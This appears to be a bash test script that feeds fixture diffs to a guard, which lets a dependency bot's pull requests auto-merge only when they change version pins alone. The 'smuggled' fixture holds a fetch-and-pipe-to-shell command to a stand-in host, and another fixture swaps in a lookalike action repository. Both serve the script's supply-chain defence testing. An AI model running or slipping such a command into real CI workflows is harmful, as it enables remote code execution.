#!/usr/bin/env bash
#
# A bot's pull request is merged with nobody looking only when it moves pins and
# nothing else.
#
# ⛔ .github/workflows/bot-merge.yml approves and merges a Renovate pull request
# once CI passes. What stands between that and a workflow change nobody read is
# the diff check in scripts/merge-bot-pr: every changed line, with its commit
# hash, its sha256 digest and its trailing version comment masked, has to be
# the line it replaced. This feeds that check the diffs it has to pass and the
# ones it has to refuse. Shapes are copied from Renovate pull requests 4 and 5.
#
# Exit status of the check: 0 pins only, 3 more than pins, 4 nothing changed.
set -euo pipefail
# shellcheck source-path=SCRIPTDIR/..
# shellcheck source=lib/harness.sh
. "$REPO_ROOT/tests/lib/harness.sh"

GUARD="$REPO_ROOT/scripts/merge-bot-pr"
if [ ! -f "$GUARD" ]; then
  fail "scripts/merge-bot-pr exists" "expected: $GUARD" \
    "reproduce: ls scripts/merge-bot-pr"
  summary
  exit 1
fi

work="$(work_dir)"
trap 'rm -rf "$work"' EXIT

# check NAME -> the guard's exit code for $work/NAME.diff
check() {
  local rc=0
  bash "$GUARD" --check-diff "$work/$1.diff" > "$work/$1.out" 2>&1 || rc=$?
  printf '%s\n' "$rc"
}

# expect NAME WANT DESC
expect() {
  local got
  got="$(check "$1")"
  if [ "$got" = "$2" ]; then
    ok "$3 (exit $got)"
  else
    fail "$3" \
      "the check exited $got, wanted $2" \
      "it said: $(awk 'NF' "$work/$1.out" | tr '\n' ' ' | cut -c1-300)" \
      "reproduce: bash tests/static/89-bot-merge-guard.sh, which keeps its fixtures under a temp dir"
  fi
}

old_sha=53b7df96c91f9c12dcc8a07bcb9ccacbed38856a
new_sha=c3c9e263c25d99ce0380d002d59b67737d91b0dc
old_dig=b860afd5823683f7ea389ba5f00d812f4fe55f6f286dea329d2abeefa535e309
new_dig=4e77cf2ea5f410e6f8be5abf93ccf17ce2436e87a138c167208356711a405dbd

# 1. An action moved to a new commit and its version comment rewritten.
cat > "$work/action.diff" <<EOF
diff --git a/.github/workflows/build-deploy.yml b/.github/workflows/build-deploy.yml
--- a/.github/workflows/build-deploy.yml
+++ b/.github/workflows/build-deploy.yml
@@ -296,1 +296,1 @@
-        uses: docker/build-push-action@$old_sha # v7.3.0
+        uses: docker/build-push-action@$new_sha # v7.4.0
EOF
expect action 0 "an action moved to a new commit hash with its version comment passes"

# 2. A base image digest moved.
cat > "$work/digest.diff" <<EOF
diff --git a/Dockerfile b/Dockerfile
--- a/Dockerfile
+++ b/Dockerfile
@@ -14,1 +14,1 @@
-FROM --platform=\$BUILDPLATFORM docker.io/library/archlinux@sha256:$old_dig AS bootstrap
+FROM --platform=\$BUILDPLATFORM docker.io/library/archlinux@sha256:$new_dig AS bootstrap
EOF
expect digest 0 "a base image moved to a new digest passes"

# 3. A pin moved and a step changed in the same pull request.
cat > "$work/smuggled.diff" <<EOF
diff --git a/.github/workflows/build-deploy.yml b/.github/workflows/build-deploy.yml
--- a/.github/workflows/build-deploy.yml
+++ b/.github/workflows/build-deploy.yml
@@ -296,2 +296,2 @@
-        uses: docker/build-push-action@$old_sha # v7.3.0
-        run: tests/run.sh static
+        uses: docker/build-push-action@$new_sha # v7.4.0
+        run: curl -sSL https://example.invalid/x | sh
EOF
expect smuggled 3 "a pin bump carrying any other change is refused"

# 4. An action moved to a different repository at the same kind of pin.
cat > "$work/renamed.diff" <<EOF
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -40,1 +40,1 @@
-        uses: actions/checkout@$old_sha # v7.0.1
+        uses: someone/checkout@$new_sha # v7.0.1
EOF
expect renamed 3 "an action swapped for another repository's is refused"

# 5. A run of hex that is not a full commit hash changed.
cat > "$work/shorthex.diff" <<EOF
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -10,1 +10,1 @@
-          key: cache-0123456789abcdef
+          key: cache-fedcba9876543210
EOF
expect shorthex 3 "a change to hex that is not a whole hash or digest is refused"

# 6. A line added, with nothing removed.
cat > "$work/added.diff" <<EOF
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -10,0 +11,1 @@
+        uses: docker/build-push-action@$new_sha # v7.4.0
EOF
expect added 3 "a pinned line added, rather than moved, is refused"

# 7. Nothing at all.
: > "$work/empty.diff"
expect empty 4 "an empty diff is reported as nothing changed, not as a pass"

summary
